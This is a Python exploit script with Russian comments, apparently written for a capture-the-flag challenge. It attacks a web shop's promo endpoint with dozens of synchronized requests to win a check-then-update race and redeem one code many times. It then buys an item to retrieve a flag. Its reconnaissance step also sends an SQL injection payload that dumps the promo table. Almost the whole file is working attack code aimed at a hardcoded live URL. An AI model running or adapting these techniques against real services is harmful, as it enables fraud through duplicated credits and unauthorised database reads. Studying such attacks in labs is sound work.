#!/usr/bin/env python3
"""
Momentum2 — TOCTOU-гонка на POST /promo/redeem.

Идея: между проверкой "uses_left > 0 / ещё не активировано" и UPDATE ... sets_left-1
есть окно. Если стартовать N запросов строго одновременно, несколько успевают пройти
проверку до записи и каждый начисляет credited.

Запуск:
    python3 race.py                 # разведка + залп N=60
    python3 race.py 150             # залп 150 потоками
    python3 race.py 150 keep        # не перерегистрироваться, использовать текущую сессию

Cookie берётся из аргумента --cookie, из env M2_COOKIE, или из файла cookie.txt рядом.
Без зависимостей: только stdlib.
"""

import os
import sys
import re
import json
import time
import random
import string
import threading
import urllib.parse
import urllib.request
import http.cookiejar

BASE = os.environ.get(
    "M2_BASE",
    "https://f8d014c65242493f.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf",
).rstrip("/")

CODE = os.environ.get("M2_CODE", "0OKVRCRTKC")
USER_PREFIX = "r"
PASS = "Pa55word!x"
HERE = os.path.dirname(os.path.abspath(__file__))

# ---------------------------------------------------------------- http layer

COOKIE = None
CJAR = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CJAR))


def _req(path, data=None, method=None, timeout=30):
    url = BASE + path
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method=method or ("POST" if body is not None else "GET"))
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("Accept", "*/*")
    req.add_header("Accept-Language", "ru-RU,ru;q=0.9")
    if COOKIE:
        req.add_header("Cookie", COOKIE)
    try:
        with OPENER.open(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            return r.status, raw, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            raw = e.read().decode("utf-8", "replace")
        except Exception:
            raw = ""
        return e.code, raw, dict(e.headers or {})
    except Exception as e:
        return 0, f"{type(e).__name__}: {e}", {}


def js(s):
    r"""Разэкранировать \\uXXXX как в браузере."""
    return re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)


def text(s):
    s = js(s)
    s = re.sub(r"<script.*?</script>", " ", s, flags=re.S | re.I)
    s = re.sub(r"<[^>]+>", " ", s)
    return re.sub(r"\s+", " ", s).strip()


def balance():
    st, raw, _ = _req("/profile")
    m = re.search(r"([\d][\d\s\u00a0]{0,14})\s*₽", text(raw))
    if not m:
        return 0
    return int(re.sub(r"\D", "", m.group(1)) or 0)


def profile_name():
    st, raw, _ = _req("/profile")
    m = re.search(r"<title>(.*?)</title>", raw, re.S)
    return m.group(1).strip() if m else ""


# ---------------------------------------------------------------- разведка


def recon():
    print("=" * 68)
    print("1) СОСТОЯНИЕ ПОСЛЕ ПЕРЕЗАПУСКА КОНТЕЙНЕРА")
    print("=" * 68)
    for code in ["WELCOME", "BONUS2024", "START10K", "TRADEDAY", "FREECASH", "NEWBIE50", CODE]:
        st, raw, _ = _req("/api/v1/promo/check?code=" + urllib.parse.quote(code))
        try:
            j = json.loads(raw)
            av = j.get("available")
        except Exception:
            av = js(raw)[:80]
        print(f"  check {code:<12} -> {st} available={av}")

    # вся таблица: uses_left по каждому коду (вдруг сброс частичный)
    q = (
        "' OR (SELECT group_concat(code||':'||uses_left,',') FROM promos)"
        " IS NOT NULL--"
    )
    st, raw, _ = _req("/api/v1/promo/check?code=" + urllib.parse.quote(q))
    print(f"  sqlite_master/probe -> {st} {js(raw)[:120]}")

    print("\n2) СЕССИЯ")
    st, raw, _ = _req("/profile")
    print(f"  /profile -> {st} | title={profile_name()!r} | баланс={balance()} ₽")


def fresh_account():
    """Новый аккаунт с проверкой, что сессия реально переключилась."""
    _req("/logout")
    time.sleep(0.4)
    user = USER_PREFIX + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    st_r, _, _ = _req("/register", {"username": user, "password": PASS})
    st_l, _, _ = _req("/login", {"username": user, "password": PASS})
    st_p, raw, _ = _req("/profile")
    ok = user in js(raw)
    print(f"  register={st_r} login={st_l} | имя {user} в профиле: {'ДА' if ok else 'НЕ НАЙДЕНО'} | баланс={balance()} ₽")
    if not ok:
        # иногда логин отвечает 200, но сессия та же — пробуем POST /login ещё раз
        _req("/login", {"username": user, "password": PASS})
        st_p, raw, _ = _req("/profile")
        ok = user in js(raw)
        print(f"  повторный login -> имя в профиле: {'ДА' if ok else 'НЕ НАЙДЕНО'}")
    if not ok:
        print("  (не критично: страница может не печатать имя — идём дальше)")
    return user


# ---------------------------------------------------------------- гонка


def volley(n, code=CODE):
    """N потоков, синхронизированных барьером. Возвращает список ответов."""
    results = [None] * n
    lock = threading.Lock()
    ready = threading.Semaphore(0)
    start = threading.Event()
    counter = {"n": 0}

    def worker(i):
        # каждый поток открывает свой сокет заранее: первый запрос GET /profile
        # прогревает TCP/TLS-соединение, чтобы POST ушёл без задержки на хендшейк
        try:
            _req("/profile", timeout=15)
        except Exception:
            pass
        with lock:
            counter["n"] += 1
            if counter["n"] == n:
                start.set()
        start.wait(timeout=60)
        st, raw, hdrs = _req("/promo/redeem", {"code": code}, timeout=30)
        results[i] = (st, raw, hdrs)

    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=120)

    hits, credited, errs = 0, 0, {}
    for r in results:
        if r is None:
            errs["<no-response>"] = errs.get("<no-response>", 0) + 1
            continue
        st, raw, _ = r
        d = js(raw)
        m = re.search(r'"credited"\s*:\s*(\d+)', d)
        if m:
            hits += 1
            credited += int(m.group(1))
        else:
            key = f"{st}:" + (re.search(r'"(?:error|message)"\s*:\s*"([^"]*)"', d).group(1) if re.search(r'"(?:error|message)"\s*:\s*"([^"]*)"', d) else text(d)[:40])
            errs[key] = errs.get(key, 0) + 1
    return hits, credited, errs


def buy():
    st, raw, _ = _req("/profile/buy")
    t = text(raw)
    flags = re.findall(r"flag\{[^}]+\}", js(raw))
    print(f"\n  POST /profile/buy -> {st}")
    print(f"  ФЛАГ: {flags}")
    m = re.search(r"(элит\w*[^.]{0,220}|код участника[^.]{0,220})", t, re.I)
    print(f"  текст: {m.group(1) if m else t[:220]}")
    return flags


def main():
    global COOKIE
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    n = int(args[0]) if args and args[0].isdigit() else 60
    keep = "keep" in args

    COOKIE = os.environ.get("M2_COOKIE", "").strip() or None
    if not COOKIE:
        cpath = os.path.join(HERE, "cookie.txt")
        if os.path.exists(cpath):
            COOKIE = open(cpath, encoding="utf-8").read().strip()
            if COOKIE.lower().startswith("cookie:"):
                COOKIE = COOKIE.split(":", 1)[1].strip()
    print(f"BASE = {BASE}")
    print(f"режим: {'текущая сессия' if keep else 'новый аккаунт'} | потоков: {n}")

    recon()
    if not keep:
        print("\n" + "=" * 68)
        print("3) НОВЫЙ АККАУНТ")
        print("=" * 68)
        user = fresh_account()
        after = balance()
        if after == 0:
            print("  баланс 0 — как у чистого аккаунта, продолжаем")
        else:
            print(f"  !! баланс {after} ₽ — похоже, сессия старая. Если гонка даст 0, причина в этом")

    print("\n" + "=" * 68)
    print(f"4) ЗАЛП: {n} одновременных POST /promo/redeem")
    print("=" * 68)
    t0 = time.time()
    hits, credited, errs = volley(n)
    dt = time.time() - t0
    print(f"  залп занял {dt:.2f} с")
    print(f"  УСПЕШНЫХ НАЧИСЛЕНИЙ: {hits}/{n} | credited суммарно = {credited} коп = {credited/100:.0f} ₽")
    for k, v in sorted(errs.items(), key=lambda x: -x[1]):
        print(f"    {v:>4} × {k}")

    bal = balance()
    print(f"\n  БАЛАНС: {bal} ₽")
    if bal >= 250000:
        buy()
    else:
        need = 250000 - bal
        print(f"  до цели не хватило {need} ₽")
        if hits >= 2:
            print(f"  ВНИМАНИЕ: гонка работает ({hits} начислений) — перезапусти контейнер и")
            print(f"  подними N до {max(n*2, 200)}, чтобы добрать одним залпом")
        else:
            print("  гонка не пробилась: проверка и UPDATE идут атомарно либо лимит уже 0")


if __name__ == "__main__":
    main()
